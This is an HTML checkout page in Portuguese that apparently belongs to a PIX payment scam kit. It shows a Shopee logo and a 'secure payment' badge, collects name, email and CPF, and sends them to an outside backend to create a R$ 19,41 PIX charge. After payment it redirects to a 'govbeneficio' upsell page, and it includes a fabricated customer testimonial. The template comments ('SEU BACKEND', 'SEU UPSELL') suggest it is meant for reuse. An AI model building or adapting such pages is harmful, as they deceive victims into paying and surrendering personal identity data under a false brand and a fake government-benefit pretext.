    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
    <link rel="preconnect" href="https://fonts.googleapis.com">

    <title>Checkout - Pagamento PIX</title>

    <style>
        :root{
            --primary: #ee4d2d; --primary-light: #f76d54; 
            --primary-glow: rgba(238, 77, 45, 0.25);
            --primary-bg: rgba(238, 77, 45, 0.08);
            --bg: #f5f5f7; --card: #fff; --txt1: #1a1a1a; --txt2: #6a6a6a; --txt3: #999;
            --border: #e8e8e8; --success: #0ca678; --warn: #ee4d2d; --err: #e74c3c;
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Montserrat',sans-serif;background:var(--bg);color:var(--txt1);min-height:100vh;-webkit-font-smoothing:antialiased}

        .topbar { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: var(--card); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-shadow: 0 1px 10px rgba(0,0,0,.05); z-index: 100; }
        .topbar-logo-img { height: 45px; max-width: 200px; object-fit: contain; }
        .topbar-secure { display: flex; align-items: center; gap: 4px; background: var(--primary-bg); color: var(--primary); padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; }

        .wrap{padding:90px 16px 32px;max-width:460px;margin:0 auto;display:block; width: 100%;}
        .box{background:var(--card);border-radius:20px;padding:24px 20px;box-shadow:0 2px 20px rgba(0,0,0,.04);margin-bottom:14px}

        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-size: 12px; font-weight: 600; color: var(--txt2); margin-bottom: 6px; }
        .form-input { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 12px; font-size: 14px; font-family: 'Montserrat', sans-serif; outline: none; background: #fafafa; }
        .btn-submit { width: 100%; height: 50px; background: linear-gradient(135deg, var(--primary), var(--primary-light)); color: #fff; border: none; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;}

        .testim-title { font-size: 16px; font-weight: 800; color: var(--txt1); margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
        .testim-item { display: flex; gap: 12px; margin-bottom: 16px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
        .testim-avatar { width: 42px; height: 42px; border-radius: 50%; background: var(--primary-bg); color: var(--primary); display: flex; align-items: center; justify-content: center; font-weight: 800; flex-shrink: 0; }
        .testim-content { flex: 1; }
        .testim-name { font-size: 13px; font-weight: 700; }
        .testim-stars { color: #f5a623; font-size: 14px; margin-bottom: 4px; }
        .testim-text { font-size: 13px; color: var(--txt2); line-height: 1.4; }

        .progress{width:100%;height:5px;background:#efefef;border-radius:3px;overflow:hidden;margin-bottom:18px}
        .progress-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--primary-light));width:15%; transition: width 0.5s;}
        .timer{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px;background:var(--primary-bg);border-radius:12px;margin-bottom:18px; color: var(--primary); font-weight: bold;}
        .valor-big{font-size:42px;font-weight:900;color:var(--primary);text-align:center; margin-bottom: 20px;}

        .qr-frame{width:224px;height:224px;background:#fff;border:3px solid var(--primary);border-radius:20px;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;overflow:hidden}
        .qr-frame img{width:194px;height:194px;}

        .pix-box{width:100%;background:#f8f9fa;border:2px dashed var(--border);border-radius:14px;padding:14px;display:flex;align-items:center;gap:10px;cursor:pointer}
        .pix-txt{flex:1;font-size:11px;font-family:monospace;color:var(--txt2);word-break:break-all;}
        .copy-btn{background:var(--primary);color:#fff;border:none;padding:10px 15px;border-radius:10px;font-weight:bold; cursor: pointer;}

        .status-bar{display:flex;align-items:center;justify-content:center;gap:10px;padding:13px;background:#fafafa;border-radius:14px;margin-top:18px; font-size: 12px; font-weight: 600; color: var(--txt2);}
        .status-spin{width:16px;height:16px;border:2px solid rgba(238,77,45,.2);border-top-color:var(--primary);border-radius:50%;animation:spin .7s linear infinite}
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .hide { display: none !important; }
        .dot { width:8px; height:8px; border-radius:50%; background:var(--warn); }
        .dot.ok { background:var(--success); }
    </style>
</head>
<body>

<div class="topbar">
    <img src="https://imgs.search.brave.com/8PRIaRNohxzrfTLtTShyHj-3feaDlVCjvXh0NnjO2fM/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdGF0/aWMuY2RubG9nby5j/b20vbG9nb3Mvcy80/My9zaG9wZWUuc3Zn" class="topbar-logo-img">
    <div class="topbar-secure"><span class="material-symbols-outlined">lock</span> Pagamento Seguro</div>
</div>

<div class="wrap" id="mainWrap">
    <div class="box fade-in" id="formCard">
        <p style="font-size: 16px; font-weight: 800; margin-bottom: 20px;"><span class="material-symbols-outlined" style="vertical-align:middle;color:var(--primary)">person</span> Dados de Cadastro</p>
        <form id="checkoutForm">
            <div class="form-group"><label>Nome Completo</label><input type="text" id="nome" class="form-input" required></div>
            <div class="form-group"><label>E-mail de Acesso</label><input type="email" id="email" class="form-input" required></div>
            <div class="form-group"><label>CPF</label><input type="text" id="cpf" class="form-input" required maxlength="14"></div>
            <button type="submit" class="btn-submit" id="btnGerar">Gerar PIX</button>
        </form>
    </div>

    <div class="box fade-in" id="testimonialsCard">
        <p class="testim-title"><span class="material-symbols-outlined">star</span> O que dizem sobre nós</p>
        <div class="testim-item">
            <div class="testim-avatar">AS</div>
            <div class="testim-content">
                <div class="testim-name">Ana Silva</div>
                <div class="testim-stars">★★★★★</div>
                <div class="testim-text">Super rápido! O acesso chegou no meu e-mail na mesma hora.</div>
            </div>
        </div>
    </div>

    <div class="box fade-in hide" id="pixCard">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
            <div style="display:flex;align-items:center;gap:8px"><div class="dot" id="statusDot"></div><span style="font-size:12px;color:var(--txt3)" id="statusLabel">Aguardando pagamento</span></div>
            <span style="background:var(--primary-bg);color:var(--primary);padding:4px 10px;border-radius:10px;font-size:10px;font-weight:bold">PIX</span>
        </div>
        <div class="progress"><div class="progress-fill" id="progBar"></div></div>
        <div class="timer"><span class="material-symbols-outlined">schedule</span> Expira em <b id="timer">05:00</b></div>
        <div class="valor-area"><p style="text-align:center;font-size:11px;color:var(--txt3)">Valor a pagar</p><p class="valor-big">R$ 19,41</p></div>
        <div class="qr-frame" id="pix-qr-img"></div>
        <div class="pix-box" onclick="copyPix()">
            <span class="pix-txt" id="pix-code-box">Carregando...</span>
            <button class="copy-btn" id="pix-copy-btn">Copiar</button>
        </div>
        <div class="status-bar"><div class="status-spin"></div><span>Verificando pagamento automaticamente...</span></div>
    </div>
</div>

<script>
const BACKEND_URL = 'https://autenticacao-ttk.site'; // SEU BACKEND
const PIX_REDIRECT = 'https://govbeneficio.vercel.app/up1.html'; // SEU UPSELL
const VALOR_CENTS = 1941;
let _pixCode = '', _pixTxid = '', _pixTimer = null;

// Máscara CPF
document.getElementById('cpf').addEventListener('input', e => {
    let v = e.target.value.replace(/\D/g, '');
    v = v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    e.target.value = v;
});

// Ação de Gerar PIX (Caminho igual ao do GOV)
document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const btn = document.getElementById('btnGerar');
    btn.disabled = true;
    btn.innerHTML = '<div class="status-spin"></div> Gerando...';

    const params = new URLSearchParams(window.location.search);
    const payload = {
        nome: document.getElementById('nome').value,
        cpf: document.getElementById('cpf').value.replace(/\D/g,''),
        email: document.getElementById('email').value,
        valor: VALOR_CENTS,
        utm_source: params.get('utm_source') || '',
        utm_medium: params.get('utm_medium') || '',
        utm_campaign: params.get('utm_campaign') || '',
        src: params.get('src') || '',
        sck: params.get('sck') || ''
    };

    try {
        const res = await fetch(BACKEND_URL + '/criar_pix.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();

        if (data.success) {
            _pixCode = data.pixCode;
            _pixTxid = data.paymentCode;

            document.getElementById('formCard').classList.add('hide');
            document.getElementById('testimonialsCard').classList.add('hide');
            document.getElementById('pixCard').classList.remove('hide');

            document.getElementById('pix-code-box').textContent = _pixCode;
            document.getElementById('pix-qr-img').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(_pixCode)}">`;

            startCountdown(300);
            pixPolling(); // Inicia verificação
        }
    } catch (err) {
        alert('Erro ao gerar PIX.');
        btn.disabled = false;
        btn.innerHTML = 'Gerar PIX';
    }
});

function pixPolling() {
    _pixTimer = setInterval(async function() {
        try {
            const r = await fetch(`${BACKEND_URL}/status_pix.php?id=${encodeURIComponent(_pixTxid)}`);
            const s = await r.json();
            if (s.status === 'approved' || s.status === 'paid') {
                clearInterval(_pixTimer);
                document.getElementById('statusLabel').textContent = 'Pagamento Confirmado!';
                document.getElementById('statusDot').classList.add('ok');

                const url = new URL(PIX_REDIRECT);
                const curParams = new URLSearchParams(window.location.search);
                curParams.forEach((val, key) => url.searchParams.set(key, val));
                setTimeout(() => window.location.href = url.toString(), 1500);
            }
        } catch (e) {}
    }, 3000);
}

function startCountdown(sec) {
    let t = sec;
    const el = document.getElementById('timer');
    const prog = document.getElementById('progBar');
    const interval = setInterval(() => {
        if (t <= 0) { clearInterval(interval); return; }
        t--;
        let m = Math.floor(t / 60).toString().padStart(2, '0');
        let s = (t % 60).toString().padStart(2, '0');
        el.textContent = `${m}:${s}`;
        prog.style.width = ((t / sec) * 100) + '%';
    }, 1000);
}

function copyPix() {
    navigator.clipboard.writeText(_pixCode).then(() => {
        const btn = document.getElementById('pix-copy-btn');
        btn.textContent = 'Copiado!';
        setTimeout(() => btn.textContent = 'Copiar', 2000);
    });
}
</script>
</body>
</html>
